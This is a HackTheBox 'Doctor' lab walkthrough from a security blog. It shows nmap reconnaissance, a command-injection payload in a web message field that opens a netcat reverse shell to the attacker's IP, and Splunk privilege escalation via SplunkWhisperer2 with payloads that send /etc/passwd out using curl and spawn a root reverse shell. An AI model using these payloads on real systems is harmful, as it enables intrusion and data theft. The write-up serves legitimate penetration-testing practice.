<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Doctor HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/doctor-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-06T18:18:19+00:00">February 6, 2021</time><time class="updated" datetime="2025-06-10T20:18:18+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “<strong>Doctor</strong>“. It’s available at HackTheBox for penetration testing practice. This laboratory is of an easy level, but with adequate basic knowledge to break the laboratories and if we pay attention to all the details we find during the examination it will not be complicated. The credit for making this lab goes to <strong>egotisticalSW</strong>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Easy</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the <strong>HackTheBox</strong> website.</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Nmap</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>SSTI Vulnerability to RCE</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abuse of Privileges Splunk</span></li>
</ul>
<ul>
<li><span style="color: #000000;"><strong>Capture the flag</strong></span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Reconnaissance</strong></span></h3>
<p><span style="color: #000000;">We will use the following commando to perform a scan to all ports with scripts and versions.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A -p- 10.10.10.209</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oFXov2vAR_w/YB7az81ImdI/AAAAAAAAtgA/Jo-nB0U3qqoXriL1Uv-N31HMo4KDzkVbwCLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">We will access the web service of <strong>port 80</strong>, Here we found a email corporate address.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ApS9a5Rn6B0/YB7a4x0PEiI/AAAAAAAAtgE/SmKd-TYyWBI6_yTj6F68UXqdl6D-UPG0gCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">We will access the web service of <strong>port 8089</strong>, Here we enumerate Splunk version.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4zx8ZNlHvd4/YB7bCU_lY4I/AAAAAAAAtgI/gj821sJtBh0scufs-8Ile5J5l7iuG7phgCLcBGAsYHQ/s16000/3.png"/></span></p>
<h3><span style="color: #800000;">Exploiting</span></h3>
<p><span style="color: #000000;">We will insert of domain “<strong>doctors.htb</strong>” in <em>“/etc/hosts</em>” file. We visite the website and we found a panel control with authenticate the system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--QQArNLS_n8/YB7bHcponyI/AAAAAAAAtgQ/JkLQmTLiSpYTWwcQQB_OPVrVT1X9WtOvwCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">We register on the website and we authenticate in log in.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lduv65aa_BM/YB7bL44XpHI/AAAAAAAAtgY/neF7rfW9YFIVGQGEO0mVATYVu5d8cx6IwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">Apparently, is possible to send messages. This messages are read for some user or server?</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f2Drl0ejE_k/YB7bQv6Sd3I/AAAAAAAAtgc/IfzrsDkcD3AR-63QiJcoVCqKQw3uXqakACLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">We will send a message to we python server with text file, as proof of concept.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Mk5drkH66Hc/YB7bVmerODI/AAAAAAAAtgg/oQGlUnULTNMprUL2EYlD8jYOn7oqQ4yrQCLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">Yeah! Somebody is accessing our file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I2KgbnXT0Qw/YB7bZ4VlQVI/AAAAAAAAtgo/YPlB1imlZrMa_hBKgNFdRnuB5BXRNLTswCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Okay, we repeat with the next <strong>payload</strong> and we will have a netcat in listen on port 5555.</span></p>
<p><span style="color: #000000;"><strong>Payload</strong>: </span></p>
<p><span style="color: #000000;"><strong>&lt;img src=http://10.10.XX.XX/$(nc.traditional$IFS-e$IFS/bin/bash$IFS’10.10.XX.XX’$IFS’5555′)&gt;</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hGeILUnPzls/YB7be_oGsPI/AAAAAAAAtgw/FN-A53JAKFgNNDinedzfvqVhXcD0wIKyQCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Yeah! We have a shell! But don’t we can read the user flag file. We need to escalate to the user.</span></p>
<p><span style="color: #000000;">We will enumerate the machine, we found the “<em>backup</em>” file with a <strong>credential</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LGqKeCzYHb4/YB7bkLK1WyI/AAAAAAAAtg4/4GovP2WLl9UxTh7Jt7FawzFTdi7QIzgawCLcBGAsYHQ/s16000/10.png"/></span></p>
<p><span style="color: #000000;">We authenticate with the user “<strong>shaun</strong>” and we read user.txt file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pSNbZxbFNXI/YB7bolHFUTI/AAAAAAAAthA/C8Tks1gY17s4Zp2tAnOl3V6DVnL9Cag0ACLcBGAsYHQ/s16000/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation (administrator)</strong></span></h3>
<p><span style="color: #000000;">We enumerate two uncommon setuid binaries with “<strong>lse.sh</strong>” script, exists exploits for the version “<strong>Exim 4.90</strong>“, but is a rabbit hole.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-28lAZR1PZhk/YB7bt0EmMhI/AAAAAAAAthI/LPjJ8XmWbJwaHoL1rVGk-MJAqX1ZQldyACLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">Remember we enumerate a <strong>Splunk</strong>, we search in Google and we found this github <strong><a style="color: #000000;" href="https://github.com/cnotin/SplunkWhisperer2">SplunkWhisperer2</a></strong>.</span></p>
<p><span style="color: #000000;">We execute this proof of concept with tool <strong>SplunkWhisperer2</strong> and we put a <strong>netcat</strong> in listening on port 5555.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.XX.XX --username shaun --password PASSWORD --payload "curl -F 'data=@/etc/passwd' http://10.10.XX.XX:6666</pre>
<p><span style="color: #000000;">Here we view the content <em>“/etc/passwd</em>” file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tMShu7Yj504/YB7byg1OVjI/AAAAAAAAthQ/QcaHsZ34xHcZ-7QmWC-z2OIIUz8OqSSAACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">We repeat the process, this occasion we use a payload for a <strong>reverse shell</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.XX.XX --username shaun --password PASSWORD --payload "nc.traditional -e /bin/sh 10.10.XX.XX 6666"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gbtYDGhxdh8/YB7b3U4L5OI/AAAAAAAAthU/zmE7rq03YVsI8kiNGY0Nqbdy0Po0dQySACLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Yeah! We have a shell as <strong>root</strong> and we read <strong>root.txt</strong> file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9uVLOwmd2y8/YB7b736-05I/AAAAAAAAthY/HbTRsY0KDRsXSBS6n1eZgYodxPzIjO-kQCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contacted on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
